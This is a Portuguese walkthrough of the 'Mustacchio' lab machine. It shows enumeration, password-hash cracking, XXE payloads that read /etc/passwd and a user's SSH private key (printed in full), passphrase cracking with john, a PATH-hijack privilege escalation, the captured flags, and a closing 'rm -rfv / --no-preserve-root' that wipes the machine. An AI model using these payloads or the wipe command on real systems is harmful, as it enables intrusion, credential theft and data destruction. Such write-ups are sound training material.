MUSTACCHIO CTF

Ao inicar dei nmap 

    nmap -A -sV IP 

Encontrei 2 portas 22, 80

Assim partindo pra procura de diretorios usando o gobuster

    gobuster dir -u IP -w directory-list-2.3-small.txt -x php,html,txt

Encontrando o diretorio /custom que possuia dentro da pasta js tinha um arquivo de backup que ao baixa-lo

    wget IP/custom/users.bak

Ao ler o arquivo encontrava-se um username e uma senha 

    admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Assim 

    username: admin
    password: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Tentando conectar no ssh com essas informacoes nao foi possivel, entao fui atras de outras formas, percebi que essa senha e uma chave encriptada entao fui a um site descriptar essa senha

    hashtoolkit

Ao colocar essa senha la ele me retornava a senha descriptada

    bulldog19

Ao tentar acessar de varias formas e sem sucesso percebi que algo estava errado, refiz os processos para ver o que deixei passar e quando refiz o nmap, percebi onde estava o erro, analisei novamente de uma forma mais agressiva 

    nmap -p- -sV IP

Assim mostrando mais 1 porta que nao tinha acesso antes.. a porta "8765"
Agora acessando essa porta IP:8765 tinha uma pagina admin... agora era so logar com os dados que ja tinhamos

    username admin
    pass bulldog19

Ao acessar esse painel admin tinha uma caixar para inserir comentarios, ao olhar o codigo fonte tinha 2 comentarios interessantes 

    //document.cookie = "Example=/auth/dontforget.bak";
    function cheacktarea() {
    let tbox = document.getElementById("box").value;
    if (tbox == null || tbox.lenght == 0 ) {
    alert("Insert XML Code!")
        }
    }

    <!-- Barry, you can now SSH in using your key! -->

Assim tendo acesso a mais um arquivo de backup e um username 

    wget IP:8765/auth/dontforget.bak

    <?xml version="1.0" encoding="UTF-8"?>
    <comment>
    <name>Joe Hamd</name>
    <author>Barry Clad</author>
    <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
    </comment>

Para explorar essa falha XXE executando o payload XML para ver se era possivel ler as pastas tambem 

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE updateProfile [
    <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
    <comment>
    <name>Joe</name>
    <author>dannydev19</author>
    <com>&file;</com>
    </comment> 

Tendo acesso a essa pasta vi que era possivel ler qualquer arquivo entao, fui atras da chave RSA do Barry 

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE updateProfile [
    <!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
    <comment>
    <name>Barry</name>
    <author>dannydev19</author>
    <com>&file;</com>
    </comment>

Assim conseguindo ter acesso a chave RSA 

    -----BEGIN RSA PRIVATE KEY----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

    jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
    bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
    MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
    l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
    Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
    NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
    ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
    TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
    rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
    bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
    4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
    7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
    T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
    ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
    LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
    pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
    laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
    vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
    DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
    6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
    ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
    7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
    1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
    +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
    7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
    -----END RSA PRIVATE KEY----

Criando o arquivo RSA

    nano barryrsa
    Introduzindo essa chave nesse arquivo

Ao tentar connectar no ssh com essa chave direto percebemos que deu outro erro , essa chave estava encriptada e precisamos da senha dela, agora para isso e preciso usar o programa john the ripper, para usar esse programa, primeiramente vemos se ele esta no nosso sistema 

    locate ssh2john.py

Assim e so executar esse arquivos passando os parametros

    python /usr/share/john/ssh2john.py barryrsa > johncracked.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt johncracked.hash

Assim conseguindo a senha do barry

    username: Barry
    password: urieljames

Assim e so conectar no ssh... Finalmente!!

    ssh -i barryrsa barry@IP

Assim conseguindo acesso a maquina

    cat user.txt
    62d77a4d5f97d47c5aa38b3b2651b831

Agora precisamos escalar nossos privilegios e se tornar o root..
Dentro do perfil do Joe tinha um arquivo chamado "live_log"

    strings live_log
    tail -f /var/log/nginx/access.log

Vendo esse arquivo tinhamos que ir ate o /tmp e criar um arquivo chamado "tail"

    nano tail
    
    "/bin/bash"
    
Adicionando perms..

    chmod 777 tail

Agora dentro do user joe executamos o arquivo "live_long" para conseguir acesso ao root
    
    ./live_log

Assim tendo acesso ao root...

    cat root.txt
    3223581420d906c4dd1a5f9b530393a5

Finalizando...

    touch dannydev19.txt
    rm -rfv / --no-preserve-root 
